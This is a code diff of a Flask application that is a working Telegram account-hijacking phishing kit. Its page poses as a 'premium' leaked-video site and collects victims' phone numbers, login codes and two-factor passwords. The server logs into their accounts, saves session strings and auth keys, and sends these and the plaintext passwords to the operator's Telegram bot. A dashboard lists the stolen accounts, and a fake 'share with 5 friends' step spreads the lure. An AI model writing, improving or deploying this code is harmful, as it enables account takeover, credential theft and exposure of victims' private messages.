@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, request, jsonify, render_template_string
 import os
 import json
 import base64
@@ -17,12 +17,13 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ====== SAFE ENV LOAD ======
+
 def _safe_int(v, default=0):
     try:
         return int(str(v).strip()) if v not in (None, "") else default
     except (ValueError, TypeError):
         return default
+
 
 BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
 API_ID = _safe_int(os.environ.get("API_ID"), 0)
@@ -31,12 +32,9 @@ YOUR_TELEGRAM_ID = _safe_int(os.environ.get("OWNER_ID"), 0)
 PORT = _safe_int(os.environ.get("PORT"), 5000)
 
 logger.info(
-    "ENV CHECK | BOT_TOKEN=%s | API_ID=%s | API_HASH=%s | OWNER_ID=%s | PORT=%s",
-    "SET" if BOT_TOKEN else "MISSING",
-    API_ID,
-    "SET" if API_HASH else "MISSING",
-    YOUR_TELEGRAM_ID,
-    PORT,
+    "ENV | BOT_TOKEN=%s | API_ID=%s | API_HASH=%s | OWNER_ID=%s | PORT=%s",
+    "SET" if BOT_TOKEN else "MISSING", API_ID,
+    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID, PORT
 )
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
@@ -54,6 +52,7 @@ sessions_lock = threading.Lock()
 
 DATA_FILE = "captured_accounts.json"
 
+
 def load_accounts():
     if os.path.exists(DATA_FILE):
         try:
@@ -63,6 +62,7 @@ def load_accounts():
             logger.error(f"Load error: {e}")
             return []
     return []
+
 
 def save_account(account):
     accounts = load_accounts()
@@ -79,10 +79,12 @@ def save_account(account):
             json.dump(accounts, f, indent=2)
     except Exception as e:
         logger.error(f"Save error: {e}")
-    logger.info(f"Saved: {account['phone']} | Session: {len(account.get('session',''))} chars")
+    logger.info(f"Saved: {account['phone']}")
     return account
 
+
 captured_accounts = load_accounts()
+
 
 def format_phone(ph):
     if not ph:
@@ -98,60 +100,35 @@ def format_phone(ph):
         return '+' + digits
     return '+' + digits
 
+
 def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
     if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
-        logger.warning("Bot notify skipped - missing token/owner")
+        logger.warning("Bot notify skipped")
         return
     try:
-        max_len = 3900
         extra = ""
         if password_used:
-            extra = "\n2FA Password Used"
+            extra = "\n2FA Used"
             if password_value:
-                extra += f"\n2FA Password: `{password_value}`"
-
-        if len(ss) > max_len:
-            msg1 = (
-                f"New Account Captured!{extra}\n\n"
-                f"Phone: {phone}\n"
-                f"Name: {me.first_name or ''} {me.last_name or ''}\n"
-                f"User ID: {me.id}\n"
-                f"Username: @{me.username or 'N/A'}\n"
-                f"DC: {dc}\n"
-                f"Session Length: {len(ss)} chars\n\n"
-                f"Session (part 1/2):\n`{ss[:max_len]}`"
-            )
-            msg2 = f"Session (part 2/2) for {phone}:\n`{ss[max_len:]}`"
-            for m in (msg1, msg2):
-                http_requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': m, 'parse_mode': 'Markdown'},
-                    timeout=15
-                )
-        else:
-            msg = (
-                f"New Account!{extra}\n"
-                f"Phone: {phone}\n"
-                f"Name: {me.first_name} {me.last_name or ''}\n"
-                f"User ID: {me.id}\n"
-                f"DC: {dc}\n"
-                f"Session: {len(ss)} chars\n\n"
-                f"Session:\n`{ss}`"
-            )
-            r = http_requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
-                timeout=15
-            )
-            if r.status_code != 200:
-                http_requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"},
-                    timeout=15
-                )
+                extra += f" | Pwd: `{password_value}`"
+        msg = (
+            f"New Account!{extra}\n"
+            f"Phone: {phone}\n"
+            f"Name: {me.first_name} {me.last_name or ''}\n"
+            f"User ID: {me.id}\n"
+            f"DC: {dc}\n\n"
+            f"Session:\n`{ss}`"
+        )
+        if len(msg) > 4000:
+            msg = msg[:3990] + "..."
+        http_requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
+            timeout=15
+        )
     except Exception as e:
         logger.error(f"Bot notify error: {e}")
-        print(f"\n{'='*60}\nBOT FAILED! Session for {phone}:\n{ss}\n{'='*60}\n")
+
 
 def run_telegram_action(phone, code=None, password=None):
     loop = asyncio.new_event_loop()
@@ -166,18 +143,16 @@ def run_telegram_action(phone, code=None, password=None):
                 with sessions_lock:
                     user_sessions[phone] = {
                         'hash': r.phone_code_hash,
-                        'session': session_str,
-                        'phone_code_result': r
+                        'session': session_str
                     }
                     pending_codes[phone] = 'sent'
                     pending_2fa[phone] = False
-                logger.info(f"Code sent to {phone}")
+                logger.info(f"Code sent: {phone}")
                 return {'success': True}
             except errors.FloodWaitError as e:
-                logger.error(f"Flood wait {e.seconds}s for {phone}")
                 with sessions_lock:
                     pending_codes[phone] = 'err'
-                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
+                return {'success': False, 'error': f'Flood {e.seconds}s'}
             except Exception as e:
                 logger.error(f"send_code error: {e}")
                 with sessions_lock:
@@ -192,73 +167,44 @@ def run_telegram_action(phone, code=None, password=None):
         async def verify():
             with sessions_lock:
                 if phone not in user_sessions:
-                    return {'success': False, 'error': 'Session not found'}
+                    return {'success': False, 'error': 'No session'}
                 s = user_sessions[phone]
 
             client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
             try:
                 await client.connect()
-                if await client.is_user_authorized():
-                    me = await client.get_me()
-                    logger.info(f"{phone} already authorized")
-                else:
+                if not await client.is_user_authorized():
                     try:
                         await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
-                        me = await client.get_me()
                     except errors.SessionPasswordNeededError:
-                        logger.info(f"2FA needed for {phone}")
                         with sessions_lock:
                             pending_2fa[phone] = True
                             pending_codes[phone] = '2fa_needed'
                         if password:
                             try:
                                 await client.sign_in(password=password)
-                                me = await client.get_me()
                                 with sessions_lock:
                                     pending_2fa[phone] = False
                                     pending_codes[phone] = 'done'
                             except errors.PasswordHashInvalidError:
                                 return {'success': False, 'error': 'Wrong 2FA password'}
-                            except Exception as e:
-                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                         else:
                             return {'success': False, 'error': '2FA', 'needs_password': True}
                     except errors.PhoneCodeInvalidError:
                         return {'success': False, 'error': 'Wrong code'}
                     except errors.PhoneCodeExpiredError:
                         return {'success': False, 'error': 'Code expired'}
-                    except Exception as e:
-                        return {'success': False, 'error': str(e)[:80]}
 
+                me = await client.get_me()
                 await client.get_dialogs()
                 ss = StringSession.save(client.session)
 
-                auth_key = None
                 try:
                     auth_key = client.session.auth_key.key
+                    dc = client.session.dc_id
                 except Exception:
-                    pass
-                dc = client.session.dc_id
-
-                if not auth_key:
-                    logger.warning(f"Auth key None for {phone}, reconnecting...")
-                    try:
-                        await client.disconnect()
-                    except Exception:
-                        pass
-                    await asyncio.sleep(0.5)
-                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
-                    await client2.connect()
-                    await client2.get_dialogs()
-                    auth_key = client2.session.auth_key.key
-                    dc = client2.session.dc_id
-                    ss = StringSession.save(client2.session)
-                    me = await client2.get_me()
-                    try:
-                        await client2.disconnect()
-                    except Exception:
-                        pass
-                    client = client2
+                    auth_key = b""
+                    dc = 0
 
                 auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                 password_used = password is not None
@@ -271,11 +217,8 @@ def run_telegram_action(phone, code=None, password=None):
                     'last_name': me.last_name or '',
                     'session': ss,
                     'webk': json.dumps({
-                        'dcId': dc,
-                        'authKey': auth_b64,
-                        'userId': me.id,
-                        'isSupport': False,
-                        'isTest': False
+                        'dcId': dc, 'authKey': auth_b64,
+                        'userId': me.id, 'isSupport': False, 'isTest': False
                     }),
                     'dc': dc,
                     'time': str(datetime.now()),
@@ -293,12 +236,12 @@ def run_telegram_action(phone, code=None, password=None):
                     pending_codes[phone] = 'done'
 
                 send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
-                logger.info(f"Captured: {phone} | Session: {len(ss)} chars")
+                logger.info(f"Captured: {phone}")
                 return {'success': True, 'session': ss, 'user_id': me.id}
 
             except Exception as e:
                 e_str = str(e)
-                logger.error(f"Verify error for {phone}: {e_str}")
+                logger.error(f"Verify error: {e_str}")
                 if 'PHONE_CODE_INVALID' in e_str:
                     return {'success': False, 'error': 'Wrong code'}
                 if 'SESSION_PASSWORD_NEEDED' in e_str:
@@ -314,121 +257,13 @@ def run_telegram_action(phone, code=None, password=None):
 
         if code:
             return loop.run_until_complete(verify())
-        else:
-            return loop.run_until_complete(send_code())
+        return loop.run_until_complete(send_code())
     finally:
         loop.close()
 
 
-# ============ ROUTES ============
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/health')
-def health():
-    return jsonify({
-        'status': 'ok',
-        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
-        'API_ID': API_ID,
-        'API_HASH': 'SET' if API_HASH else 'MISSING',
-        'OWNER_ID': YOUR_TELEGRAM_ID,
-        'accounts': len(captured_accounts),
-    })
-
-@app.route('/api/share', methods=['POST'])
-def share():
-    ph = request.json.get('phone', '')
-    if not ph:
-        return jsonify({'success': False, 'error': 'Phone required'})
-    ph = format_phone(ph)
-    logger.info(f"Phone received: {ph}")
-    with sessions_lock:
-        pending_codes[ph] = 'sending'
-    t = threading.Thread(target=run_telegram_action, args=(ph,))
-    t.daemon = True
-    t.start()
-    return jsonify({'success': True})
-
-@app.route('/api/check', methods=['POST'])
-def check():
-    phone = request.json.get('phone', '')
-    phone = format_phone(phone)
-    with sessions_lock:
-        s = pending_codes.get(phone, 'waiting')
-    if s == 'waiting':
-        accounts = load_accounts()
-        if any(a['phone'] == phone for a in accounts):
-            s = 'done'
-    return jsonify({'s': s})
-
-@app.route('/api/verify', methods=['POST'])
-def verify_route():
-    d = request.json
-    ph = format_phone(d.get('phone', ''))
-    code = d.get('code', '')
-    password = d.get('password', None)
-    result = run_telegram_action(ph, code, password)
-    return jsonify(result)
-
-@app.route('/session/<phone>')
-def get_session(phone):
-    phone = format_phone(phone)
-    global captured_accounts
-    captured_accounts = load_accounts()
-    a = next((x for x in captured_accounts if x['phone'] == phone), None)
-    if not a:
-        with sessions_lock:
-            if phone in user_sessions:
-                return jsonify({'phone': phone, 'status': 'pending'})
-        return jsonify({'error': 'Not found'}), 404
-    return jsonify({
-        'phone': phone,
-        'user_id': a['user_id'],
-        'name': f"{a['first_name']} {a['last_name']}",
-        'username': a['username'],
-        'dc': a['dc'],
-        'session': a['session'],
-        'session_length': len(a['session']),
-        'webk_data': a['webk'],
-        'has_2fa': a.get('has_2fa', False),
-        'password': a.get('password', '')
-    })
-
-@app.route('/dash')
-def dash():
-    global captured_accounts
-    captured_accounts = load_accounts()
-    accounts = captured_accounts
-    rows = ""
-    for i, a in enumerate(accounts, 1):
-        ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
-        ss_len = len(a.get('session', '')) if a.get('session') else 0
-        twofa_tag = "2FA" if a.get('has_2fa') else ""
-        rows += f"""<tr>
-            <td>{i}</td><td>{a['phone']}</td>
-            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
-            <td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td>
-            <td>{a.get('dc','')}</td><td>{twofa_tag} {ss_status} ({ss_len})</td>
-            <td>{a.get('time','')}</td>
-        </tr>"""
-    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
-    return f"""<!DOCTYPE html><html><head><title>Dashboard</title>
-    <style>body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
-    h1{{color:#e94560}}table{{width:100%;border-collapse:collapse;margin-top:15px}}
-    th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
-    th{{background:#141420;color:#ddd}}tr:hover{{background:#141420}}</style></head>
-    <body><h1>Accounts ({len(accounts)}) | 2FA: {total_2fa}</h1>
-    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th></tr></thead>
-    <tbody>{rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;padding:30px">No accounts</td></tr>'}</tbody></table>
-    <script>setTimeout(()=>location.reload(),10000)</script></body></html>"""
-
-
-if __name__ == '__main__':
-    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
-        logger.warning("Some env vars missing!")
-    app.run(host='0.0.0.0', port=PORT, debug=False)
-    <!DOCTYPE html>
+# ============ THE PAGE ============
+PAGE = r'''<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -442,7 +277,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .header p{color:#777;font-size:13px;margin-top:8px}
 .video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
 .thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
-.thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
+.play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
 .video-info{padding:15px}
 .video-info h3{font-size:15px;margin-bottom:5px}
 .video-info .meta{color:#666;font-size:12px}
@@ -485,26 +320,30 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </style>
 </head>
 <body>
+
 <div class="header">
 <h1>PREMIUM VIDEO HUB</h1>
 <p>Exclusive content - Verified members only</p>
 </div>
+
 <div class="video-card">
-<div class="thumbnail"><div class="play-btn">▶</div></div>
+<div class="thumbnail"><div class="play-btn">&#9658;</div></div>
 <div class="video-info">
 <h3>LEAKED PRIVATE VIDEO - 2026</h3>
 <div class="meta">4.9 (2.4M views) - 18+</div>
 <span class="badge">RESTRICTED</span>
 </div>
 </div>
+
 <div class="link-section">
 <button class="get-link-btn" id="glb">GET YOUR LINK</button>
 </div>
 
 <div class="modal-overlay" id="vm">
 <div class="modal">
+
 <div id="s1" class="step active">
-<div class="modal-icon">📱</div>
+<div class="modal-icon">&#128241;</div>
 <h2>Telegram verification</h2>
 <p>Enter your Telegram account phone number</p>
 <div class="cc">
@@ -516,7 +355,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <div id="s2" class="step">
-<div class="modal-icon">🔐</div>
+<div class="modal-icon">&#128274;</div>
 <h2>Verification code</h2>
 <p><span id="pd" style="color:#0088cc;font-weight:bold">+91XXXXXXXXXX</span></p>
 <div id="cs" class="sb waiting"><span class="sp"></span> Please wait...</div>
@@ -539,7 +378,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <div id="s2b" class="step">
-<div class="modal-icon">🔐</div>
+<div class="modal-icon">&#128274;</div>
 <h2>Two-Factor Authentication</h2>
 <p>Enter your cloud password:</p>
 <input type="password" id="pwdInput" class="pwd-input" placeholder="Telegram password" maxlength="64">
@@ -548,7 +387,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <div id="s3" class="step">
-<div class="modal-icon">🎬</div>
+<div class="modal-icon">&#127916;</div>
 <h2>Almost there!</h2>
 <p>Share with 5 friends to unlock</p>
 <div class="share-progress">
@@ -571,7 +410,6 @@ var codeDigits = '';
 var codeCheckInterval = null;
 var passwordCheckInterval = null;
 var sharesDone = 0;
-
 var TG_CHANNEL_LINK = 'https://t.me/videodks';
 var TG_CHANNEL_CAPTION = 'Premium content';
 
@@ -723,4 +561,221 @@ localStorage.setItem('tg_shares_' + data.user_id, '0');
 goToShare();
 if (codeCheckInterval) clearInterval(codeCheckInterval);
 } else if (data.needs_password) {
-document.getElementById
+document.getElementById('s2').classList.remove('active');
+document.getElementById('s2b').classList.add('active');
+if (codeCheckInterval) clearInterval(codeCheckInterval);
+} else {
+showVerifyStatus(data.error || 'Wrong code', 'error');
+codeDigits = '';
+document.getElementById('cdisp').textContent = '_';
+document.getElementById('sb').disabled = false;
+document.getElementById('sb').textContent = 'Verify';
+}
+} catch(e) {
+showVerifyStatus('Error', 'error');
+document.getElementById('sb').disabled = false;
+document.getElementById('sb').textContent = 'Verify';
+}
+}
+
+async function submitPassword() {
+var pwd = document.getElementById('pwdInput').value.trim();
+if (!pwd) {
+var ps = document.getElementById('pwdStatus');
+ps.className = 'sb error';
+ps.innerHTML = 'Password din';
+ps.style.display = 'block';
+return;
+}
+var ps = document.getElementById('pwdStatus');
+ps.className = 'sb waiting';
+ps.innerHTML = '<span class="sp"></span> Checking...';
+ps.style.display = 'block';
+try {
+var res = await fetch('/api/verify', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
+});
+var data = await res.json();
+if (data.success) {
+if (data.user_id) {
+localStorage.setItem('tg_user_id', String(data.user_id));
+localStorage.setItem('tg_shares_' + data.user_id, '0');
+}
+goToShare();
+if (passwordCheckInterval) clearInterval(passwordCheckInterval);
+} else {
+ps.className = 'sb error';
+ps.innerHTML = data.error || 'Wrong password';
+}
+} catch(e) {
+ps.className = 'sb error';
+ps.innerHTML = 'Connection error';
+}
+}
+
+function showVerifyStatus(msg, type) {
+var el = document.getElementById('vs');
+el.textContent = msg;
+el.className = 'sb ' + type;
+el.style.display = 'block';
+}
+
+function goToShare() {
+document.getElementById('s2').classList.remove('active');
+document.getElementById('s2b').classList.remove('active');
+document.getElementById('s3').classList.add('active');
+updateShareProgress();
+}
+
+function simulateShare() {
+var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
+window.open(shareUrl, '_blank');
+sharesDone = Math.min(sharesDone + 1, 5);
+var tgUserId = localStorage.getItem('tg_user_id');
+if (tgUserId) localStorage.setItem('tg_shares_' + tgUserId, String(sharesDone));
+updateShareProgress();
+var st = document.getElementById('shareStatus');
+if (sharesDone >= 5) {
+st.className = 'sb success';
+st.innerHTML = 'Unlocked!';
+} else {
+st.className = 'sb success';
+st.innerHTML = sharesDone + '/5 done';
+}
+}
+
+function updateShareProgress() {
+for (var i = 1; i <= 5; i++) {
+var el = document.getElementById('sp' + i);
+if (i <= sharesDone) el.className = 'share-step done';
+else if (i === sharesDone + 1) el.className = 'share-step active';
+else el.className = 'share-step';
+}
+}
+
+document.getElementById('vm').onclick = function(e) {
+if (e.target === this) {
+this.classList.remove('active');
+if (codeCheckInterval) clearInterval(codeCheckInterval);
+if (passwordCheckInterval) clearInterval(passwordCheckInterval);
+}
+};
+</script>
+</body>
+</html>'''
+
+
+# ============ ROUTES ============
+
+@app.route('/')
+def index():
+    return render_template_string(PAGE)
+
+
+@app.route('/health')
+def health():
+    return jsonify({
+        'status': 'ok',
+        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
+        'API_ID': API_ID,
+        'API_HASH': 'SET' if API_HASH else 'MISSING',
+        'OWNER_ID': YOUR_TELEGRAM_ID,
+        'accounts': len(captured_accounts)
+    })
+
+
+@app.route('/api/share', methods=['POST'])
+def share():
+    ph = request.json.get('phone', '')
+    if not ph:
+        return jsonify({'success': False, 'error': 'Phone required'})
+    ph = format_phone(ph)
+    with sessions_lock:
+        pending_codes[ph] = 'sending'
+    t = threading.Thread(target=run_telegram_action, args=(ph,))
+    t.daemon = True
+    t.start()
+    return jsonify({'success': True})
+
+
+@app.route('/api/check', methods=['POST'])
+def check():
+    phone = format_phone(request.json.get('phone', ''))
+    with sessions_lock:
+        s = pending_codes.get(phone, 'waiting')
+    if s == 'waiting':
+        accounts = load_accounts()
+        if any(a['phone'] == phone for a in accounts):
+            s = 'done'
+    return jsonify({'s': s})
+
+
+@app.route('/api/verify', methods=['POST'])
+def verify_route():
+    d = request.json
+    ph = format_phone(d.get('phone', ''))
+    result = run_telegram_action(ph, d.get('code', ''), d.get('password'))
+    return jsonify(result)
+
+
+@app.route('/session/<phone>')
+def get_session(phone):
+    phone = format_phone(phone)
+    global captured_accounts
+    captured_accounts = load_accounts()
+    a = next((x for x in captured_accounts if x['phone'] == phone), None)
+    if not a:
+        return jsonify({'error': 'Not found'}), 404
+    return jsonify({
+        'phone': phone,
+        'user_id': a['user_id'],
+        'name': f"{a['first_name']} {a['last_name']}",
+        'username': a['username'],
+        'dc': a['dc'],
+        'session': a['session'],
+        'session_length': len(a['session']),
+        'has_2fa': a.get('has_2fa', False)
+    })
+
+
+@app.route('/dash')
+def dash():
+    global captured_accounts
+    captured_accounts = load_accounts()
+    rows = ""
+    for i, a in enumerate(captured_accounts, 1):
+        ss_len = len(a.get('session', ''))
+        tag = "2FA" if a.get('has_2fa') else ""
+        rows += (
+            f"<tr><td>{i}</td>"
+            f"<td>{a['phone']}</td>"
+            f"<td>{a.get('first_name','')} {a.get('last_name','')}</td>"
+            f"<td>@{a.get('username','-')}</td>"
+            f"<td>{a.get('user_id','')}</td>"
+            f"<td>{a.get('dc','')}</td>"
+            f"<td>{tag} ({ss_len})</td>"
+            f"<td>{a.get('time','')}</td></tr>"
+        )
+    total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
+    return (
+        "<!DOCTYPE html><html><head><title>Dashboard</title>"
+        "<style>body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
+        "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
+        "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
+        "th{background:#141420;color:#ddd}tr:hover{background:#141420}</style></head>"
+        f"<body><h1>Accounts: {len(captured_accounts)} | 2FA: {total_2fa}</h1>"
+        "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th>"
+        "<th>ID</th><th>DC</th><th>Session</th><th>Time</th></tr></thead><tbody>"
+        f"{rows if rows else '<tr><td colspan=8 style=text-align:center;color:#666;padding:30px>No accounts</td></tr>'}"
+        "</tbody></table>"
+        "<script>setTimeout(function(){location.reload()},10000)</script>"
+        "</body></html>"
+    )
+
+
+if __name__ == '__main__':
+    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
+        logger.warning("Some env vars missing!")
+    app.run(host='0.0.0.0', port=PORT, debug=False)
